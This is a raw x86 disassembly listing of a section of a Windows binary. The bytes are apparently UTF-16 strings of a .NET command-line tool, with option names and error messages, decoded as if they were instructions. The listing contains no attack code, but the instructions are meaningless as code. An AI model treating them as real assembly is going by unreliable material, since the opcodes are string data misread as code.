  4091ba:	inc    ebp
  4091bb:	add    BYTE PTR [eax+0x0],bh
  4091be:	imul   eax,DWORD PTR [eax],0x740073
  4091c4:	add    BYTE PTR [edi],bl
  4091c6:	dec    ecx
  4091c7:	add    BYTE PTR [esi+0x0],ch
  4091ca:	jbe    0x4091cc
  4091cc:	popa   
  4091cd:	add    BYTE PTR [eax+eax*1+0x69],ch
  4091d1:	add    BYTE PTR [eax+eax*1+0x4c],ah
  4091d5:	add    BYTE PTR [ecx+0x0],ah
  4091d8:	outs   dx,BYTE PTR ds:[esi]
  4091d9:	add    BYTE PTR [edi+0x0],ah
  4091dc:	jne    0x4091de
  4091de:	popa   
  4091df:	add    BYTE PTR [edi+0x0],ah
  4091e2:	add    BYTE PTR gs:[eax],al
  4091e5:	pop    ss
  4091e6:	dec    esi
  4091e7:	add    BYTE PTR [edi+0x0],ch
  4091ea:	dec    esp
  4091eb:	add    BYTE PTR [ecx+0x0],ah
  4091ee:	outs   dx,BYTE PTR ds:[esi]
  4091ef:	add    BYTE PTR [edi+0x0],ah
  4091f2:	push   eax
  4091f3:	add    BYTE PTR [ecx+0x0],ah
  4091f6:	jb     0x4091f8
  4091f8:	popa   
  4091f9:	add    BYTE PTR [ebp+0x0],ch
  4091fc:	add    BYTE PTR ds:0x6f004e,bl
  409202:	dec    ebp
  409203:	add    BYTE PTR [ebp+0x0],dh
  409206:	ins    BYTE PTR es:[edi],dx
  409207:	add    BYTE PTR [eax+eax*1+0x41],dh
  40920b:	add    BYTE PTR [ebx+0x0],dh
  40920e:	jae    0x409210
  409210:	add    BYTE PTR gs:[ebp+0x0],ch
  409214:	bound  eax,QWORD PTR [eax]
  409216:	ins    BYTE PTR es:[edi],dx
  409217:	add    BYTE PTR [ecx+0x0],bh
  40921a:	add    BYTE PTR [ecx],ch
  40921c:	dec    esi
  40921d:	add    BYTE PTR [edi+0x0],ch
  409220:	dec    esi
  409221:	add    BYTE PTR [ecx+0x0],ah
  409224:	ins    DWORD PTR es:[edi],dx
  409225:	add    BYTE PTR [ebp+0x0],ah
  409228:	jae    0x40922a
  40922a:	jo     0x40922c
  40922c:	popa   
  40922d:	add    BYTE PTR [ebx+0x0],ah
  409230:	add    BYTE PTR gs:[eax+0x0],dl
  409234:	popa   
  409235:	add    BYTE PTR [edx+0x0],dh
  409238:	popa   
  409239:	add    BYTE PTR [ebp+0x0],ch
  40923c:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  409241:	add    BYTE PTR [edx+0x0],dh
  409244:	add    BYTE PTR ds:0x6f004e,dl
  40924a:	dec    edi
  40924b:	add    BYTE PTR [ebp+0x0],dh
  40924e:	je     0x409250
  409250:	push   eax
  409251:	add    BYTE PTR [ecx+0x0],ah
  409254:	jb     0x409256
  409256:	popa   
  409257:	add    BYTE PTR [ebp+0x0],ch
  40925a:	add    BYTE PTR [edi],ah
  40925c:	push   esp
  40925d:	add    BYTE PTR [edi+0x0],ch
  409260:	outs   dx,DWORD PTR ds:[esi]
  409261:	add    BYTE PTR [ebp+0x0],cl
  409264:	popa   
  409265:	add    BYTE PTR [esi+0x0],ch
  409268:	jns    0x40926a
  40926a:	inc    ebx
  40926b:	add    BYTE PTR [edi+0x0],ch
  40926e:	ins    BYTE PTR es:[edi],dx
  40926f:	add    BYTE PTR [eax+eax*1+0x61],ch
  409273:	add    BYTE PTR [eax+0x0],dh
  409276:	jae    0x409278
  409278:	add    BYTE PTR gs:[ecx+0x0],al
  40927c:	jb     0x40927e
  40927e:	add    BYTE PTR [bp+di+0x0],dh
  409282:	add    BYTE PTR [ebx],bl
  409284:	push   esp
  409285:	add    BYTE PTR [edi+0x0],ch
  409288:	outs   dx,DWORD PTR ds:[esi]
  409289:	add    BYTE PTR [ebp+0x0],cl
  40928c:	popa   
  40928d:	add    BYTE PTR [esi+0x0],ch
  409290:	jns    0x409292
  409292:	push   ebx
  409293:	add    BYTE PTR [ebp+0x0],ah
  409296:	outs   dx,BYTE PTR ds:[esi]
  409297:	add    BYTE PTR [eax+eax*1+0x65],ah
  40929b:	add    BYTE PTR [edx+0x0],dh
  40929e:	add    BYTE PTR [edi],bl
  4092a0:	push   ebp
  4092a1:	add    BYTE PTR [esi+0x0],ch
  4092a4:	imul   eax,DWORD PTR [eax],0x6e
  4092a7:	add    BYTE PTR [edi+0x0],ch
  4092aa:	ja     0x4092ac
  4092ac:	outs   dx,BYTE PTR ds:[esi]
  4092ad:	add    BYTE PTR [eax+eax*1+0x61],cl
  4092b1:	add    BYTE PTR [esi+0x0],ch
  4092b4:	add    BYTE PTR [di+0x0],dh
  4092b8:	popa   
  4092b9:	add    BYTE PTR [edi+0x0],ah
  4092bc:	add    BYTE PTR gs:[eax],al
  4092bf:	and    DWORD PTR [ebp+0x0],edx
  4092c2:	outs   dx,BYTE PTR ds:[esi]
  4092c3:	add    BYTE PTR [ebx+0x0],ch
  4092c6:	outs   dx,BYTE PTR ds:[esi]
  4092c7:	add    BYTE PTR [edi+0x0],ch
  4092ca:	ja     0x4092cc
  4092cc:	outs   dx,BYTE PTR ds:[esi]
  4092cd:	add    BYTE PTR [eax+0x0],dl
  4092d0:	popa   
  4092d1:	add    BYTE PTR [edx+0x0],dh
  4092d4:	popa   
  4092d5:	add    BYTE PTR [ebp+0x0],ch
  4092d8:	add    BYTE PTR gs:[eax+eax*1+0x65],dh
  4092dd:	add    BYTE PTR [edx+0x0],dh
  4092e0:	add    BYTE PTR [ebx],ah
  4092e2:	push   edi
  4092e3:	add    BYTE PTR [ebx+0x0],ah
  4092e6:	popa   
  4092e7:	add    BYTE PTR [eax+0x0],cl
  4092ea:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4092ef:	add    BYTE PTR [ecx+0x0],al
  4092f2:	jb     0x4092f4
  4092f4:	add    BYTE PTR [di+0x0],dh
  4092f8:	ins    DWORD PTR es:[edi],dx
  4092f9:	add    BYTE PTR [ebp+0x0],ah
  4092fc:	outs   dx,BYTE PTR ds:[esi]
  4092fd:	add    BYTE PTR [eax+eax*1+0x73],dh
  409301:	add    BYTE PTR [ecx],dh
  409303:	add    BYTE PTR [eax],al
  409305:	and    edx,DWORD PTR [edi+0x0]
  409308:	arpl   WORD PTR [eax],ax
  40930a:	popa   
  40930b:	add    BYTE PTR [eax+0x0],cl
  40930e:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  409313:	add    BYTE PTR [ecx+0x0],al
  409316:	jb     0x409318
  409318:	add    BYTE PTR [di+0x0],dh
  40931c:	ins    DWORD PTR es:[edi],dx
  40931d:	add    BYTE PTR [ebp+0x0],ah
  409320:	outs   dx,BYTE PTR ds:[esi]
  409321:	add    BYTE PTR [eax+eax*1+0x73],dh
  409325:	add    BYTE PTR [edx],dh
  409327:	add    BYTE PTR [eax],al
  409329:	and    edx,DWORD PTR [edi+0x0]
  40932c:	arpl   WORD PTR [eax],ax
  40932e:	popa   
  40932f:	add    BYTE PTR [eax+0x0],cl
  409332:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  409337:	add    BYTE PTR [ecx+0x0],al
  40933a:	jb     0x40933c
  40933c:	add    BYTE PTR [di+0x0],dh
  409340:	ins    DWORD PTR es:[edi],dx
  409341:	add    BYTE PTR [ebp+0x0],ah
  409344:	outs   dx,BYTE PTR ds:[esi]
  409345:	add    BYTE PTR [eax+eax*1+0x73],dh
  409349:	add    BYTE PTR [ebx],dh
  40934b:	add    BYTE PTR [eax],al
  40934d:	sbb    edx,DWORD PTR [edi+0x0]
  409350:	arpl   WORD PTR [eax],ax
  409352:	popa   
  409353:	add    BYTE PTR [eax+0x0],cl
  409356:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40935b:	add    BYTE PTR [ecx+0x0],cl
  40935e:	outs   dx,BYTE PTR ds:[esi]
  40935f:	add    BYTE PTR [eax+eax*1+0x72],dh
  409363:	add    BYTE PTR [edi+0x0],ch
  409366:	xor    DWORD PTR [eax],eax
  409368:	add    BYTE PTR [ebx],bl
  40936a:	push   edi
  40936b:	add    BYTE PTR [ebx+0x0],ah
  40936e:	popa   
  40936f:	add    BYTE PTR [eax+0x0],cl
  409372:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  409377:	add    BYTE PTR [ecx+0x0],cl
  40937a:	outs   dx,BYTE PTR ds:[esi]
  40937b:	add    BYTE PTR [eax+eax*1+0x72],dh
  40937f:	add    BYTE PTR [edi+0x0],ch
  409382:	xor    al,BYTE PTR [eax]
  409384:	add    BYTE PTR [ebx],bl
  409386:	push   edi
  409387:	add    BYTE PTR [ebx+0x0],ah
  40938a:	popa   
  40938b:	add    BYTE PTR [eax+0x0],cl
  40938e:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  409393:	add    BYTE PTR [ecx+0x0],cl
  409396:	outs   dx,BYTE PTR ds:[esi]
  409397:	add    BYTE PTR [eax+eax*1+0x72],dh
  40939b:	add    BYTE PTR [edi+0x0],ch
  40939e:	xor    eax,DWORD PTR [eax]
  4093a0:	add    BYTE PTR [ecx],ah
  4093a2:	push   edi
  4093a3:	add    BYTE PTR [ebx+0x0],ah
  4093a6:	popa   
  4093a7:	add    BYTE PTR [eax+0x0],cl
  4093aa:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4093af:	add    BYTE PTR [edi+0x0],cl
  4093b2:	jo     0x4093b4
  4093b4:	je     0x4093b6
  4093b6:	imul   eax,DWORD PTR [eax],0x6e006f
  4093bc:	jae    0x4093be
  4093be:	xor    BYTE PTR [eax],al
  4093c0:	xor    DWORD PTR [eax],eax
  4093c2:	add    BYTE PTR [ecx],ah
  4093c4:	push   edi
  4093c5:	add    BYTE PTR [ebx+0x0],ah
  4093c8:	popa   
  4093c9:	add    BYTE PTR [eax+0x0],cl
  4093cc:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4093d1:	add    BYTE PTR [edi+0x0],cl
  4093d4:	jo     0x4093d6
  4093d6:	je     0x4093d8
  4093d8:	imul   eax,DWORD PTR [eax],0x6e006f
  4093de:	jae    0x4093e0
  4093e0:	xor    BYTE PTR [eax],al
  4093e2:	xor    al,BYTE PTR [eax]
  4093e4:	add    BYTE PTR [ecx],ah
  4093e6:	push   edi
  4093e7:	add    BYTE PTR [ebx+0x0],ah
  4093ea:	popa   
  4093eb:	add    BYTE PTR [eax+0x0],cl
  4093ee:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4093f3:	add    BYTE PTR [edi+0x0],cl
  4093f6:	jo     0x4093f8
  4093f8:	je     0x4093fa
  4093fa:	imul   eax,DWORD PTR [eax],0x6e006f
  409400:	jae    0x409402
  409402:	xor    BYTE PTR [eax],al
  409404:	xor    eax,DWORD PTR [eax]
  409406:	add    BYTE PTR [ecx],ah
  409408:	push   edi
  409409:	add    BYTE PTR [ebx+0x0],ah
  40940c:	popa   
  40940d:	add    BYTE PTR [eax+0x0],cl
  409410:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  409415:	add    BYTE PTR [edi+0x0],cl
  409418:	jo     0x40941a
  40941a:	je     0x40941c
  40941c:	imul   eax,DWORD PTR [eax],0x6e006f
  409422:	jae    0x409424
  409424:	xor    BYTE PTR [eax],al
  409426:	xor    al,0x0
  409428:	add    BYTE PTR [ecx],ah
  40942a:	push   edi
  40942b:	add    BYTE PTR [ebx+0x0],ah
  40942e:	popa   
  40942f:	add    BYTE PTR [eax+0x0],cl
  409432:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  409437:	add    BYTE PTR [edi+0x0],cl
  40943a:	jo     0x40943c
  40943c:	je     0x40943e
  40943e:	imul   eax,DWORD PTR [eax],0x6e006f
  409444:	jae    0x409446
  409446:	xor    BYTE PTR [eax],al
  409448:	xor    eax,0x57210000
  40944d:	add    BYTE PTR [ebx+0x0],ah
  409450:	popa   
  409451:	add    BYTE PTR [eax+0x0],cl
  409454:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  409459:	add    BYTE PTR [edi+0x0],cl
  40945c:	jo     0x40945e
  40945e:	je     0x409460
  409460:	imul   eax,DWORD PTR [eax],0x6e006f
  409466:	jae    0x409468
  409468:	xor    BYTE PTR [eax],al
  40946a:	add    BYTE PTR ss:[eax],al
  40946d:	and    DWORD PTR [edi+0x0],edx
  409470:	arpl   WORD PTR [eax],ax
  409472:	popa   
  409473:	add    BYTE PTR [eax+0x0],cl
  409476:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40947b:	add    BYTE PTR [edi+0x0],cl
  40947e:	jo     0x409480
  409480:	je     0x409482
  409482:	imul   eax,DWORD PTR [eax],0x6e006f
  409488:	jae    0x40948a
  40948a:	xor    BYTE PTR [eax],al
  40948c:	aaa    
  40948d:	add    BYTE PTR [eax],al
  40948f:	and    DWORD PTR [edi+0x0],edx
  409492:	arpl   WORD PTR [eax],ax
  409494:	popa   
  409495:	add    BYTE PTR [eax+0x0],cl
  409498:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40949d:	add    BYTE PTR [edi+0x0],cl
  4094a0:	jo     0x4094a2
  4094a2:	je     0x4094a4
  4094a4:	imul   eax,DWORD PTR [eax],0x6e006f
  4094aa:	jae    0x4094ac
  4094ac:	xor    BYTE PTR [eax],al
  4094ae:	cmp    BYTE PTR [eax],al
  4094b0:	add    BYTE PTR [ecx],ah
  4094b2:	push   edi
  4094b3:	add    BYTE PTR [ebx+0x0],ah
  4094b6:	popa   
  4094b7:	add    BYTE PTR [eax+0x0],cl
  4094ba:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4094bf:	add    BYTE PTR [edi+0x0],cl
  4094c2:	jo     0x4094c4
  4094c4:	je     0x4094c6
  4094c6:	imul   eax,DWORD PTR [eax],0x6e006f
  4094cc:	jae    0x4094ce
  4094ce:	xor    BYTE PTR [eax],al
  4094d0:	cmp    DWORD PTR [eax],eax
  4094d2:	add    BYTE PTR [ecx],ah
  4094d4:	push   edi
  4094d5:	add    BYTE PTR [ebx+0x0],ah
  4094d8:	popa   
  4094d9:	add    BYTE PTR [eax+0x0],cl
  4094dc:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4094e1:	add    BYTE PTR [edi+0x0],cl
  4094e4:	jo     0x4094e6
  4094e6:	je     0x4094e8
  4094e8:	imul   eax,DWORD PTR [eax],0x6e006f
  4094ee:	jae    0x4094f0
  4094f0:	xor    DWORD PTR [eax],eax
  4094f2:	xor    BYTE PTR [eax],al
  4094f4:	add    BYTE PTR [ecx],ah
  4094f6:	push   edi
  4094f7:	add    BYTE PTR [ebx+0x0],ah
  4094fa:	popa   
  4094fb:	add    BYTE PTR [eax+0x0],cl
  4094fe:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  409503:	add    BYTE PTR [edi+0x0],cl
  409506:	jo     0x409508
  409508:	je     0x40950a
  40950a:	imul   eax,DWORD PTR [eax],0x6e006f
  409510:	jae    0x409512
  409512:	xor    DWORD PTR [eax],eax
  409514:	xor    DWORD PTR [eax],eax
  409516:	add    BYTE PTR [ecx],ah
  409518:	push   edi
  409519:	add    BYTE PTR [ebx+0x0],ah
  40951c:	popa   
  40951d:	add    BYTE PTR [eax+0x0],cl
  409520:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  409525:	add    BYTE PTR [edi+0x0],cl
  409528:	jo     0x40952a
  40952a:	je     0x40952c
  40952c:	imul   eax,DWORD PTR [eax],0x6e006f
  409532:	jae    0x409534
  409534:	xor    DWORD PTR [eax],eax
  409536:	xor    al,BYTE PTR [eax]
  409538:	add    BYTE PTR [ecx],ah
  40953a:	push   edi
  40953b:	add    BYTE PTR [ebx+0x0],ah
  40953e:	popa   
  40953f:	add    BYTE PTR [eax+0x0],cl
  409542:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  409547:	add    BYTE PTR [edi+0x0],cl
  40954a:	jo     0x40954c
  40954c:	je     0x40954e
  40954e:	imul   eax,DWORD PTR [eax],0x6e006f
  409554:	jae    0x409556
  409556:	xor    DWORD PTR [eax],eax
  409558:	xor    eax,DWORD PTR [eax]
  40955a:	add    BYTE PTR [ecx],ah
  40955c:	push   edi
  40955d:	add    BYTE PTR [ebx+0x0],ah
  409560:	popa   
  409561:	add    BYTE PTR [eax+0x0],cl
  409564:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  409569:	add    BYTE PTR [edi+0x0],cl
  40956c:	jo     0x40956e
  40956e:	je     0x409570
  409570:	imul   eax,DWORD PTR [eax],0x6e006f
  409576:	jae    0x409578
  409578:	xor    DWORD PTR [eax],eax
  40957a:	xor    al,0x0
  40957c:	add    BYTE PTR [ecx],ah
  40957e:	push   edi
  40957f:	add    BYTE PTR [ebx+0x0],ah
  409582:	popa   
  409583:	add    BYTE PTR [eax+0x0],cl
  409586:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40958b:	add    BYTE PTR [edi+0x0],cl
  40958e:	jo     0x409590
  409590:	je     0x409592
  409592:	imul   eax,DWORD PTR [eax],0x6e006f
  409598:	jae    0x40959a
  40959a:	xor    DWORD PTR [eax],eax
  40959c:	xor    eax,0x57210000
  4095a1:	add    BYTE PTR [ebx+0x0],ah
  4095a4:	popa   
  4095a5:	add    BYTE PTR [eax+0x0],cl
  4095a8:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4095ad:	add    BYTE PTR [edi+0x0],cl
  4095b0:	jo     0x4095b2
  4095b2:	je     0x4095b4
  4095b4:	imul   eax,DWORD PTR [eax],0x6e006f
  4095ba:	jae    0x4095bc
  4095bc:	xor    DWORD PTR [eax],eax
  4095be:	add    BYTE PTR ss:[eax],al
  4095c1:	and    DWORD PTR [edi+0x0],edx
  4095c4:	arpl   WORD PTR [eax],ax
  4095c6:	popa   
  4095c7:	add    BYTE PTR [eax+0x0],cl
  4095ca:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4095cf:	add    BYTE PTR [edi+0x0],cl
  4095d2:	jo     0x4095d4
  4095d4:	je     0x4095d6
  4095d6:	imul   eax,DWORD PTR [eax],0x6e006f
  4095dc:	jae    0x4095de
  4095de:	xor    DWORD PTR [eax],eax
  4095e0:	aaa    
  4095e1:	add    BYTE PTR [eax],al
  4095e3:	and    DWORD PTR [edi+0x0],edx
  4095e6:	arpl   WORD PTR [eax],ax
  4095e8:	popa   
  4095e9:	add    BYTE PTR [eax+0x0],cl
  4095ec:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  4095f1:	add    BYTE PTR [edi+0x0],cl
  4095f4:	jo     0x4095f6
  4095f6:	je     0x4095f8
  4095f8:	imul   eax,DWORD PTR [eax],0x6e006f
  4095fe:	jae    0x409600
  409600:	xor    DWORD PTR [eax],eax
  409602:	cmp    BYTE PTR [eax],al
  409604:	add    BYTE PTR [ebx],bl
  409606:	push   edi
  409607:	add    BYTE PTR [ebx+0x0],ah
  40960a:	popa   
  40960b:	add    BYTE PTR [eax+0x0],cl
  40960e:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  409613:	add    BYTE PTR [ebp+0x0],dl
  409616:	jae    0x409618
  409618:	popa   
  409619:	add    BYTE PTR [edi+0x0],ah
  40961c:	add    BYTE PTR gs:[ecx],dh
  40961f:	add    BYTE PTR [eax],al
  409621:	sbb    edx,DWORD PTR [edi+0x0]
  409624:	arpl   WORD PTR [eax],ax
  409626:	popa   
  409627:	add    BYTE PTR [eax+0x0],cl
  40962a:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40962f:	add    BYTE PTR [ebp+0x0],dl
  409632:	jae    0x409634
  409634:	popa   
  409635:	add    BYTE PTR [edi+0x0],ah
  409638:	add    BYTE PTR gs:[edx],dh
  40963b:	add    BYTE PTR [eax],al
  40963d:	sbb    edx,DWORD PTR [edi+0x0]
  409640:	arpl   WORD PTR [eax],ax
  409642:	popa   
  409643:	add    BYTE PTR [eax+0x0],cl
  409646:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40964b:	add    BYTE PTR [ebp+0x0],dl
  40964e:	jae    0x409650
  409650:	popa   
  409651:	add    BYTE PTR [edi+0x0],ah
  409654:	add    BYTE PTR gs:[ebx],dh
  409657:	add    BYTE PTR [eax],al
  409659:	sbb    edx,DWORD PTR [edi+0x0]
  40965c:	arpl   WORD PTR [eax],ax
  40965e:	popa   
  40965f:	add    BYTE PTR [eax+0x0],cl
  409662:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  409667:	add    BYTE PTR [ebp+0x0],dl
  40966a:	jae    0x40966c
  40966c:	popa   
  40966d:	add    BYTE PTR [edi+0x0],ah
  409670:	add    BYTE PTR gs:[eax+eax*1],dh
  409674:	add    BYTE PTR [ebx],bl
  409676:	push   edi
  409677:	add    BYTE PTR [edx+0x0],dh
  40967a:	outs   dx,DWORD PTR ds:[esi]
  40967b:	add    BYTE PTR [esi+0x0],ch
  40967e:	add    BYTE PTR [bx+di+0x0],al
  409682:	jb     0x409684
  409684:	add    BYTE PTR [bp+di+0x0],al
  409688:	outs   dx,DWORD PTR ds:[esi]
  409689:	add    BYTE PTR [ebp+0x0],dh
  40968c:	outs   dx,BYTE PTR ds:[esi]
  40968d:	add    BYTE PTR [eax+eax*1+0x0],dh
  409691:	sbb    BYTE PTR [edi+0x520045],0x52
  409698:	add    BYTE PTR [edi+0x0],cl
  40969b:	push   edx
  40969c:	add    BYTE PTR [edx],bh
  40969e:	add    BYTE PTR [eax],ah
  4096a0:	add    BYTE PTR [eax+eax*1+0x69],al
  4096a4:	add    BYTE PTR [eax+eax*1+0x20],ah
  4096a8:	add    BYTE PTR [esi+0x0],ch
  4096ab:	outs   dx,DWORD PTR ds:[esi]
  4096ac:	add    BYTE PTR [eax+eax*1+0x20],dh
  4096b0:	add    BYTE PTR [esi+0x0],ah
  4096b3:	imul   eax,DWORD PTR [eax],0x64006e
  4096b9:	and    BYTE PTR [eax],al
  4096bb:	popa   
  4096bc:	add    BYTE PTR [esi+0x0],ch
  4096bf:	jns    0x4096c1
  4096c1:	and    BYTE PTR [eax],al
  4096c3:	imul   eax,DWORD PTR [eax],0x74006e
  4096c9:	add    BYTE PTR gs:[edx+0x0],dh
  4096cd:	data16 add BYTE PTR [ecx+0x0],ah
  4096d1:	arpl   WORD PTR [eax],ax
  4096d3:	add    BYTE PTR gs:[ebx+0x0],dh
  4096d7:	and    BYTE PTR [eax],al
  4096d9:	ja     0x4096db
  4096db:	imul   eax,DWORD PTR [eax],0x680074
  4096e1:	and    BYTE PTR [eax],al
  4096e3:	je     0x4096e5
  4096e5:	push   0x20006500
  4096ea:	add    BYTE PTR [ebx+0x0],bh
  4096ed:	xor    BYTE PTR [eax],al
  4096ef:	jge    0x4096f1
  4096f1:	add    BYTE PTR cs:[eax],ah
  4096f4:	add    BYTE PTR [eax],ah
  4096f6:	add    BYTE PTR [esi+0x0],cl
  4096f9:	outs   dx,DWORD PTR ds:[esi]
  4096fa:	add    BYTE PTR [eax],ah
  4096fc:	add    BYTE PTR [ecx+0x0],ah
  4096ff:	arpl   WORD PTR [eax],ax
  409701:	je     0x409703
  409703:	imul   eax,DWORD PTR [eax],0x690076
  409709:	je     0x40970b
  40970b:	imul   eax,DWORD PTR [eax],0x730065
  409711:	and    BYTE PTR [eax],al
  409713:	ja     0x409715
  409715:	add    BYTE PTR gs:[edx+0x0],dh
  409719:	add    BYTE PTR gs:[eax],ah
  40971c:	add    BYTE PTR [edi+0x0],ah
  40971f:	add    BYTE PTR gs:[esi+0x0],ch
  409723:	add    BYTE PTR gs:[edx+0x0],dh
  409727:	popa   
  409728:	add    BYTE PTR [eax+eax*1+0x65],dh
  40972c:	add    BYTE PTR [eax+eax*1+0x2e],ah
  409730:	add    BYTE PTR [eax],al
  409732:	xor    eax,0x6f0044
  409737:	outs   dx,BYTE PTR ds:[esi]
  409738:	add    BYTE PTR [ebp+0x0],ah
  40973b:	and    BYTE PTR [eax],al
  40973d:	jo     0x40973f
  40973f:	jb     0x409741
  409741:	outs   dx,DWORD PTR ds:[esi]
  409742:	add    BYTE PTR [ebx+0x0],ah
  409745:	add    BYTE PTR gs:[ebx+0x0],dh
  409749:	jae    0x40974b
  40974b:	imul   eax,DWORD PTR [eax],0x67006e
  409751:	add    BYTE PTR cs:[eax],ah
  409754:	add    BYTE PTR [eax],ah
  409756:	add    BYTE PTR [ebp+0x0],al
  409759:	js     0x40975b
  40975b:	imul   eax,DWORD PTR [eax],0x690074
  409761:	outs   dx,BYTE PTR ds:[esi]
  409762:	add    BYTE PTR [edi+0x0],ah
  409765:	add    BYTE PTR cs:[eax],al
  409768:	push   ecx
  409769:	inc    ebp
  40976a:	add    BYTE PTR [edx+0x0],dl
  40976d:	push   edx
  40976e:	add    BYTE PTR [edi+0x0],cl
  409771:	push   edx
  409772:	add    BYTE PTR [edx],bh
  409774:	add    BYTE PTR [eax],ah
  409776:	add    BYTE PTR [ebp+0x0],al
  409779:	js     0x40977b
  40977b:	imul   eax,DWORD PTR [eax],0x690074
  409781:	outs   dx,BYTE PTR ds:[esi]
  409782:	add    BYTE PTR [edi+0x0],ah
  409785:	and    BYTE PTR [eax],al
  409787:	bound  eax,QWORD PTR [eax]
  409789:	add    BYTE PTR gs:[ebx+0x0],ah
  40978d:	popa   
  40978e:	add    BYTE PTR [ebp+0x0],dh
  409791:	jae    0x409793
  409793:	add    BYTE PTR gs:[eax],ah
  409796:	add    BYTE PTR [edi+0x0],ch
  409799:	data16 add BYTE PTR [eax],ah
  40979c:	add    BYTE PTR [ebp+0x0],ah
  40979f:	js     0x4097a1
  4097a1:	arpl   WORD PTR [eax],ax
  4097a3:	add    BYTE PTR gs:[eax+0x0],dh
  4097a7:	je     0x4097a9
  4097a9:	imul   eax,DWORD PTR [eax],0x6e006f
  4097af:	cmp    al,BYTE PTR [eax]
  4097b1:	and    BYTE PTR [eax],al
  4097b3:	jnp    0x4097b5
  4097b5:	xor    BYTE PTR [eax],al
  4097b7:	jge    0x4097b9
  4097b9:	add    BYTE PTR ds:0x520045,dl
  4097bf:	push   edx
  4097c0:	add    BYTE PTR [edi+0x0],cl
  4097c3:	push   edx
  4097c4:	add    BYTE PTR [edx],bh
  4097c6:	add    BYTE PTR [eax],ah
  4097c8:	add    BYTE PTR [ebx+0x0],bh
  4097cb:	xor    BYTE PTR [eax],al
  4097cd:	jge    0x4097cf
  4097cf:	add    BYTE PTR [ebx],al
  4097d1:	sub    eax,0x2f030100
  4097d6:	add    BYTE PTR [eax],al
  4097d8:	add    eax,0x3f002f
  4097dd:	add    BYTE PTR [ebx],bl
  4097df:	das    
  4097e0:	add    BYTE PTR [ebx+0x0],ah
  4097e3:	outs   dx,DWORD PTR ds:[esi]
  4097e4:	add    BYTE PTR [eax+eax*1+0x6c],ch
  4097e8:	add    BYTE PTR [ecx+0x0],ah
  4097eb:	jo     0x4097ed
  4097ed:	jae    0x4097ef
  4097ef:	add    BYTE PTR gs:[ecx+0x0],ah
  4097f3:	jb     0x4097f5
  4097f5:	add    BYTE PTR [bp+di+0x0],dh
  4097f9:	add    BYTE PTR ds:0x63002f,al
  4097ff:	add    BYTE PTR ds:0x69002f,bl
  409805:	outs   dx,BYTE PTR ds:[esi]
  409806:	add    BYTE PTR [ebx+0x0],ah
  409809:	ins    BYTE PTR es:[edi],dx
  40980a:	add    BYTE PTR [ebp+0x0],dh
  40980d:	add    BYTE PTR fs:[ebp+0x0],ah
  409811:	jae    0x409813
  409813:	add    BYTE PTR gs:[esi+0x0],ch
  409817:	add    BYTE PTR fs:[ebp+0x0],ah
  40981b:	jb     0x40981d
  40981d:	add    BYTE PTR ds:0x69002f,al
  409823:	add    BYTE PTR [ecx],cl
  409825:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40982a:	add    BYTE PTR [eax+eax*1+0x0],ch
  40982e:	or     DWORD PTR [esi],ebp
  409830:	add    BYTE PTR [ebp+0x0],ah
  409833:	js     0x409835
  409835:	add    BYTE PTR gs:[eax],al
  409838:	pop    es
  409839:	das    
  40983a:	add    BYTE PTR [eax+eax*1+0x3a],ch
  40983e:	add    BYTE PTR [eax],al
  409840:	adc    eax,0x6c002f
  409845:	popa   
  409846:	add    BYTE PTR [esi+0x0],ch
  409849:	add    BYTE PTR [di+0x0],dh
  40984d:	popa   
  40984e:	add    BYTE PTR [edi+0x0],ah
  409851:	add    BYTE PTR gs:[edx],bh
  409854:	add    BYTE PTR [eax],al
  409856:	pop    es
  409857:	das    
  409858:	add    BYTE PTR [edi+0x0],ch
  40985b:	cmp    al,BYTE PTR [eax]
  40985d:	add    BYTE PTR [ebx],cl
  40985f:	das    
  409860:	add    BYTE PTR [edi+0x0],ch
  409863:	jne    0x409865
  409865:	je     0x409867
  409867:	cmp    al,BYTE PTR [eax]
  409869:	add    BYTE PTR [edi],al
  40986b:	das    
  40986c:	add    BYTE PTR [esi+0x0],ch
  40986f:	cmp    al,BYTE PTR [eax]
  409871:	add    BYTE PTR [edi],dl
  409873:	das    
  409874:	add    BYTE PTR [esi+0x0],ch
  409877:	popa   
  409878:	add    BYTE PTR [ebp+0x0],ch
  40987b:	add    BYTE PTR gs:[ebx+0x0],dh
  40987f:	jo     0x409881
  409881:	popa   
  409882:	add    BYTE PTR [ebx+0x0],ah
  409885:	add    BYTE PTR gs:[edx],bh
  409888:	add    BYTE PTR [eax],al
  40988a:	add    BYTE PTR [eax],al
  40988c:	dec    eax
  40988d:	xor    al,0x65
  40988f:	mov    ds:0x40257fc7,eax
  409894:	mov    esi,0x134cd4c9
  409899:	xchg   edi,eax
  40989a:	fadd   DWORD PTR [ecx]
  40989c:	add    BYTE PTR [eax],cl
  40989e:	mov    bh,0x7a
  4098a0:	pop    esp
  4098a1:	push   esi
  4098a2:	sbb    DWORD PTR [eax+eiz*8],esi
  4098a5:	mov    DWORD PTR [ebx],eax
